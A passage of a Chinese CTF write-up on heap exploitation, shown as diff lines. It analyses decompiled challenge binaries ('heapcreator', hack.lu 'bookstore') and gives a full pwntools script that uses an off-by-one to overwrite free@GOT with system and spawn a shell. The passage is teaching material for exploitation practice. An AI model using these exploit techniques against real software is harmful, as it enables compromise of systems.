+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 create_heap()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; &#x2F;&#x2F; rbx</span><br><span class="line">  int i; &#x2F;&#x2F; [rsp+4h] [rbp-2Ch]</span><br><span class="line">  size_t size; &#x2F;&#x2F; [rsp+8h] [rbp-28h]</span><br><span class="line">  char buf[8]; &#x2F;&#x2F; [rsp+10h] [rbp-20h] BYREF</span><br><span class="line">  unsigned __int64 v5; &#x2F;&#x2F; [rsp+18h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  v5 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  for ( i &#x3D; 0; i &lt;&#x3D; 9; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( !*(&amp;heaparray + i) )</span><br><span class="line">    &#123;</span><br><span class="line">      *(&amp;heaparray + i) &#x3D; malloc(0x10uLL);</span><br><span class="line">      if ( !*(&amp;heaparray + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;Allocate Error&quot;);</span><br><span class="line">        exit(1);</span><br><span class="line">      &#125;</span><br><span class="line">      printf(&quot;Size of Heap : &quot;);</span><br><span class="line">      read(0, buf, 8uLL);</span><br><span class="line">      size &#x3D; atoi(buf);</span><br><span class="line">      v0 &#x3D; (__int64)*(&amp;heaparray + i);</span><br><span class="line">      *(_QWORD *)(v0 + 8) &#x3D; malloc(size);</span><br><span class="line">      if ( !*((_QWORD *)*(&amp;heaparray + i) + 1) )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;Allocate Error&quot;);</span><br><span class="line">        exit(2);</span><br><span class="line">      &#125;</span><br><span class="line">      *(_QWORD *)*(&amp;heaparray + i) &#x3D; size;</span><br><span class="line">      printf(&quot;Content of heap:&quot;);</span><br><span class="line">      read_input(*((_QWORD *)*(&amp;heaparray + i) + 1), size);</span><br><span class="line">      puts(&quot;SuccessFul&quot;);</span><br><span class="line">      return __readfsqword(0x28u) ^ v5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p> 最多可以创建10个heap，首先申请0x10大小的空间来存放heap的size和content地址，然后用户输入heap的size和content，程序申请size大小的空间来存放content；所有的heap通过heaparray的数组结构来管理；</p>
+</li>
+<li><p>Edit a Heap：</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 edit_heap()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; [rsp+Ch] [rbp-14h]</span><br><span class="line">  char buf[8]; &#x2F;&#x2F; [rsp+10h] [rbp-10h] BYREF</span><br><span class="line">  unsigned __int64 v3; &#x2F;&#x2F; [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, buf, 4uLL);</span><br><span class="line">  v1 &#x3D; atoi(buf);</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt; 9 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( *(&amp;heaparray + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Content of heap : &quot;);</span><br><span class="line">    read_input(*((void **)*(&amp;heaparray + v1) + 1), *(_QWORD *)*(&amp;heaparray + v1) + 1LL);	&#x2F;&#x2F; 多读入一个字节，存在off-by-one</span><br><span class="line">    puts(&quot;Done !&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No such heap !&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p> 用户输入需要修改的heap的索引index，然后判断index是否合法，最后根据index可以修改对应的heap中的content；因为在读入用户输入的content的时候对读取了一个字节<code>*(_QWORD *)*(&amp;heaparray + v1) + 1LL</code>，<strong>存在off-by-one漏洞</strong>；</p>
+</li>
+<li><p>Show a Heap：</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 show_heap()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; [rsp+Ch] [rbp-14h]</span><br><span class="line">  char buf[8]; &#x2F;&#x2F; [rsp+10h] [rbp-10h] BYREF</span><br><span class="line">  unsigned __int64 v3; &#x2F;&#x2F; [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, buf, 4uLL);</span><br><span class="line">  v1 &#x3D; atoi(buf);</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt; 9 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( *(&amp;heaparray + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Size : %ld\nContent : %s\n&quot;, *(_QWORD *)*(&amp;heaparray + v1), *((const char **)*(&amp;heaparray + v1) + 1));</span><br><span class="line">    puts(&quot;Done !&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No such heap !&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p> 根据用户输入的index显示heap的size和content；</p>
+</li>
+<li><p>Delete a Heap：</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 delete_heap()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; [rsp+Ch] [rbp-14h]</span><br><span class="line">  char buf[8]; &#x2F;&#x2F; [rsp+10h] [rbp-10h] BYREF</span><br><span class="line">  unsigned __int64 v3; &#x2F;&#x2F; [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, buf, 4uLL);</span><br><span class="line">  v1 &#x3D; atoi(buf);</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt; 9 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( *(&amp;heaparray + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    free(*((void **)*(&amp;heaparray + v1) + 1));</span><br><span class="line">    free(*(&amp;heaparray + v1));</span><br><span class="line">    *(&amp;heaparray + v1) &#x3D; 0LL;</span><br><span class="line">    puts(&quot;Done !&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No such heap !&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p> 根据用户输入的index删除heap，释放申请的content和heap的堆空间，并置为NULL。</p>
+</li>
+</ol>
+<p><strong>漏洞利用：</strong></p>
+<ol>
+<li> 通过off-by-one漏洞可以覆盖相邻的下一个chunk的size的低字节，修改下一个chunk的大小；</li>
+<li> 申请修改后的chunk，产生chunk overlapping，修改关键指针实现任意地址读写；</li>
+<li> 通过修改content的内容来泄露free函数的got表地址，进而计算出libc基地址，然后修改free函数的got表为system函数的地址，最后free触发system函数。</li>
+</ol>
+<p>主要流程如下图：</p>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20220224225227485.png"></p>
+<p>先create两个heap：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create(0x18, &quot;aaaa&quot;)  # heap0</span><br><span class="line">create(0x10, &quot;bbbb&quot;)  # heap1</span><br></pre></td></tr></table></figure>
+<p>heap0的大小是0x18，将大小设置成0x18的原因是需要复用prev_size的空间才能达到修改下一chunk size的目的，malloc 0x18，堆管理器会分配0x10的空间，剩下的0x8大小的空间就复用prev_size的空间，这样当content0溢出的时候，才会覆盖到下一个chunk（heap1 struct chunk）的size；heap1的大小是0x10，这里设置为0x10是有必要的，因为后面利用的时候需要将heap1 struct chunk放到content1 chunk的下一个，这样才可以利用chunk overlapping覆盖并修改heap1 struct chunk的content1_ptr，实现任意地址读写。</p>
+<p>通过edit content0覆盖heap1 struct chunk的size域：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(0, &quot;&#x2F;bin&#x2F;sh\x00&quot; + &quot;a&quot; * 0x10 + &quot;\x41&quot;)</span><br></pre></td></tr></table></figure>
+<p>首先向content0中写入”/bin/sh\x00”，因为后面修改free函数的got表为system函数的地址之后，delete heap1时content0中的内容就是system函数的参数。”a” * 0x10是填充，”\x41”覆盖heap1 struct chunk的size为0x40是因为需要这么大的空间才能覆盖修改到后面的new_content1_ptr；</p>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20220225201155299.png"></p>
+<p>free heap1：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete(1)</span><br></pre></td></tr></table></figure>
+<p>free heap1之后，heap1 struct chunk和content1 chunk都会分别被放到fastbin的0x40和0x20的bin中；</p>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20220225201244220.png"></p>
+<p>接下来再create new heap1并填充 new_content1_ptr 为free函数的got表地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create(0x30, &quot;a&quot; * 0x20 + p64(0x30) + p64(elf.got[&#39;free&#39;]))</span><br><span class="line">						  ^			   ^</span><br><span class="line">						  |			   |</span><br><span class="line">				  new_heap1_size  new_content1_ptr</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20220225201528652.png"></p>
+<p>通过Show Heap功能泄露free函数的got表地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">show(1)</span><br><span class="line">r.recvuntil(&quot;Content : &quot;)</span><br><span class="line">data &#x3D; r.recvuntil(&quot;Done !&quot;)</span><br><span class="line"></span><br><span class="line">free_addr &#x3D; u64(data.split(&quot;\n&quot;)[0].ljust(8, &quot;\x00&quot;))</span><br><span class="line">libc_base &#x3D; free_addr - libc.symbols[&#39;free&#39;]</span><br><span class="line">log.success(&#39;libc base addr: &#39; + hex(libc_base))</span><br><span class="line">system_addr &#x3D; libc_base + libc.symbols[&#39;system&#39;]</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20220225201843141.png"></p>
+<p>写free函数的got表地址为system函数的地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(1, p64(system_addr))</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20220225202126751.png"></p>
+<p>触发system(“/bin/sh”)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">delete(0)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20220225000948174.png" alt style="zoom:200%;">
+
+<p>题目设计比较巧妙的地方是先释放content0 chunk，这也是为什么提前将”/bin/sh\x00”写入content0。</p>
+<p><strong>exp：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">io &#x3D; process(&quot;.&#x2F;heapcreator&quot;)</span><br><span class="line">#io &#x3D; gdb.debug([&#39;.&#x2F;heapcreator&#39;], &quot;b *main&quot;)</span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;heapcreator&quot;)</span><br><span class="line">#libc &#x3D; ELF(&quot;.&#x2F;libc.so.6&quot;)</span><br><span class="line">libc &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">def create(size, content):</span><br><span class="line">	io.sendlineafter(&quot;Your choice :&quot;, &quot;1&quot;)</span><br><span class="line">	io.sendlineafter(&quot;Size of Heap : &quot;, str(size))</span><br><span class="line">	io.sendlineafter(&quot;Content of heap:&quot;, content)</span><br><span class="line"></span><br><span class="line">def edit(index, content):</span><br><span class="line">	io.sendlineafter(&quot;Your choice :&quot;, &quot;2&quot;)</span><br><span class="line">	io.sendlineafter(&quot;Index :&quot;, str(index))</span><br><span class="line">	io.sendlineafter(&quot;Content of heap : &quot;, content)</span><br><span class="line">	</span><br><span class="line">def show(index):</span><br><span class="line">	io.sendlineafter(&quot;Your choice :&quot;, &quot;3&quot;)</span><br><span class="line">	io.sendlineafter(&quot;Index :&quot;, str(index))</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">	io.sendlineafter(&quot;Your choice :&quot;, &quot;4&quot;)</span><br><span class="line">	io.sendlineafter(&quot;Index :&quot;, str(index))</span><br><span class="line"></span><br><span class="line">create(0x18, &quot;aaaa&quot;)  # heap0</span><br><span class="line">create(0x10, &quot;bbbb&quot;)  # heap1</span><br><span class="line">edit(0, &quot;&#x2F;bin&#x2F;sh\x00&quot; + &quot;a&quot; * 0x10 + &quot;\x41&quot;)</span><br><span class="line">delete(1)</span><br><span class="line">create(0x30, &quot;a&quot; * 0x20 + p64(0x30) + p64(elf.got[&#39;free&#39;]))</span><br><span class="line">show(1)</span><br><span class="line">io.recvuntil(&quot;Content : &quot;)</span><br><span class="line">data &#x3D; io.recvuntil(&quot;Done !&quot;)</span><br><span class="line"></span><br><span class="line">free_addr &#x3D; u64(data.split(&quot;\n&quot;)[0].ljust(8, &quot;\x00&quot;))</span><br><span class="line">libc_base &#x3D; free_addr - libc.symbols[&#39;free&#39;]</span><br><span class="line">log.success(&#39;libc base addr: &#39; + hex(libc_base))</span><br><span class="line">system_addr &#x3D; libc_base + libc.symbols[&#39;system&#39;]</span><br><span class="line">edit(1, p64(system_addr))</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>因为libc版本和ubuntu16.04系统上的libc版本有差别，导致运行程序所用的libc和题目所给的libc（远程libc）不同，参考教程<a target="_blank" rel="noopener" href="https://blog.csdn.net/yongbaoii/article/details/111938821%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E7%9A%84ld%E5%92%8Clibc%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%89%BE%E4%B8%8D%E5%88%B0%E5%92%8C%E9%A2%98%E7%9B%AE%E6%89%80%E7%BB%99%E7%9A%84libc%E7%9B%B8%E5%8C%B9%E9%85%8D%E7%9A%84ld%EF%BC%8C%E8%80%8C%E4%B8%94patchelf%E4%B9%8B%E5%90%8E%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E4%B8%8D%E4%BA%86%EF%BC%8C%E6%9A%82%E6%97%B6%E5%85%88%E7%94%A8%E7%B3%BB%E7%BB%9F%E7%9A%84libc%E6%B3%84%E9%9C%B2%E5%9C%B0%E5%9D%80%E3%80%82">https://blog.csdn.net/yongbaoii/article/details/111938821修改程序的ld和libc，发现找不到和题目所给的libc相匹配的ld，而且patchelf之后程序运行不了，暂时先用系统的libc泄露地址。</a></p>
+<h3 id="2015-hacklu-bookstore"><a href="#2015-hacklu-bookstore" class="headerlink" title="2015 hacklu bookstore"></a>2015 hacklu bookstore</h3><p><strong>保护：</strong></p>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20220227154557611.png"></p>
+<p>开启了Canary和NX保护。</p>
+<p><strong>架构：x86_64</strong></p>
+<p><strong>主要功能：</strong></p>
+<p>程序是一个书店的订书系统，每次最多可以订两本书。</p>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20220227155005613.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(int a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; &#x2F;&#x2F; [rsp+4h] [rbp-BCh]</span><br><span class="line">  const char *v5; &#x2F;&#x2F; [rsp+8h] [rbp-B8h]</span><br><span class="line">  void *order1; &#x2F;&#x2F; [rsp+18h] [rbp-A8h]</span><br><span class="line">  void *order2; &#x2F;&#x2F; [rsp+20h] [rbp-A0h]</span><br><span class="line">  char *dest; &#x2F;&#x2F; [rsp+28h] [rbp-98h]</span><br><span class="line">  char s[136]; &#x2F;&#x2F; [rsp+30h] [rbp-90h] BYREF</span><br><span class="line">  unsigned __int64 v10; &#x2F;&#x2F; [rsp+B8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v10 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  order1 &#x3D; malloc(0x80uLL);</span><br><span class="line">  order2 &#x3D; malloc(0x80uLL);</span><br><span class="line">  dest &#x3D; (char *)malloc(0x80uLL);</span><br><span class="line">  if ( !order1 || !order2 || !dest )</span><br><span class="line">  &#123;</span><br><span class="line">    fwrite(&quot;Something failed!\n&quot;, 1uLL, 0x12uLL, stderr);</span><br><span class="line">    return 1LL;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 &#x3D; 0;</span><br><span class="line">  puts(</span><br><span class="line">    &quot; _____          _   _                 _          _                   _ \n&quot;</span><br><span class="line">    &quot;&#x2F;__   \\_____  _| |_| |__   ___   ___ | | __  ___| |_ ___  _ __ ___  &#x2F; \\\n&quot;</span><br><span class="line">    &quot;  &#x2F; &#x2F;\\&#x2F; _ \\ \\&#x2F; &#x2F; __| &#39;_ \\ &#x2F; _ \\ &#x2F; _ \\| |&#x2F; &#x2F; &#x2F; __| __&#x2F; _ \\| &#39;__&#x2F; _ \\&#x2F;  &#x2F;\n&quot;</span><br><span class="line">    &quot; &#x2F; &#x2F; |  __&#x2F;&gt;  &lt;| |_| |_) | (_) | (_) |   &lt;  \\__ \\ || (_) | | |  __&#x2F;\\_&#x2F; \n&quot;</span><br><span class="line">    &quot; \\&#x2F;   \\___&#x2F;_&#x2F;\\_\\\\__|_.__&#x2F; \\___&#x2F; \\___&#x2F;|_|\\_\\ |___&#x2F;\\__\\___&#x2F;|_|  \\___\\&#x2F;   \n&quot;</span><br><span class="line">    &quot;Crappiest and most expensive books for your college education!\n&quot;</span><br><span class="line">    &quot;\n&quot;</span><br><span class="line">    &quot;We can order books for you in case they&#39;re not in stock.\n&quot;</span><br><span class="line">    &quot;Max. two orders allowed!\n&quot;);</span><br><span class="line">LABEL_14:</span><br><span class="line">  while ( !v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;1: Edit order 1&quot;);</span><br><span class="line">    puts(&quot;2: Edit order 2&quot;);</span><br><span class="line">    puts(&quot;3: Delete order 1&quot;);</span><br><span class="line">    puts(&quot;4: Delete order 2&quot;);</span><br><span class="line">    puts(&quot;5: Submit&quot;);</span><br><span class="line">    fgets(s, 128, stdin);</span><br><span class="line">    switch ( s[0] )</span><br><span class="line">    &#123;</span><br><span class="line">      case &#39;1&#39;:</span><br><span class="line">        puts(&quot;Enter first order:&quot;);</span><br><span class="line">        edit_order(order1);</span><br><span class="line">        strcpy(dest, &quot;Your order is submitted!\n&quot;);</span><br><span class="line">        goto LABEL_14;</span><br><span class="line">      case &#39;2&#39;:</span><br><span class="line">        puts(&quot;Enter second order:&quot;);</span><br><span class="line">        edit_order(order2);</span><br><span class="line">        strcpy(dest, &quot;Your order is submitted!\n&quot;);</span><br><span class="line">        goto LABEL_14;</span><br><span class="line">      case &#39;3&#39;:</span><br><span class="line">        delete_order(order1);</span><br><span class="line">        goto LABEL_14;</span><br><span class="line">      case &#39;4&#39;:</span><br><span class="line">        delete_order(order2);</span><br><span class="line">        goto LABEL_14;</span><br><span class="line">      case &#39;5&#39;:</span><br><span class="line">        v5 &#x3D; (const char *)malloc(0x140uLL);</span><br><span class="line">        if ( !v5 )</span><br><span class="line">        &#123;</span><br><span class="line">          fwrite(&quot;Something failed!\n&quot;, 1uLL, 0x12uLL, stderr);</span><br><span class="line">          return 1LL;</span><br><span class="line">        &#125;</span><br><span class="line">        submit(v5, order1, order2);</span><br><span class="line">        v4 &#x3D; 1;</span><br><span class="line">        break;</span><br><span class="line">      default:</span><br><span class="line">        goto LABEL_14;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;%s&quot;, v5);</span><br><span class="line">  printf(dest);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>程序一开始就malloc了order1，order2和dest的空间，用户可以编辑和删除order，然后是malloc一个0x140大小的堆块并提交order，最后是打印order的信息。在最后printf输出的地方存在<strong>格式化字符串漏洞</strong>。</p>
+<p>edit_order：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall edit_order_1(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; eax</span><br><span class="line">  int v3; &#x2F;&#x2F; [rsp+10h] [rbp-10h]</span><br><span class="line">  int v4; &#x2F;&#x2F; [rsp+14h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v5; &#x2F;&#x2F; [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  v3 &#x3D; 0;</span><br><span class="line">  v4 &#x3D; 0;</span><br><span class="line">  while ( v3 !&#x3D; &#39;\n&#39; )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 &#x3D; fgetc(stdin);</span><br><span class="line">    v1 &#x3D; v4++;</span><br><span class="line">    *(_BYTE *)(v1 + a1) &#x3D; v3;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(v4 - 1LL + a1) &#x3D; 0;</span><br><span class="line">  return __readfsqword(0x28u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>edit_order没有长度限制，<strong>存在溢出</strong>，可以一直接收输入直到输入\n字符。</p>
+<p>delete_order：</p>
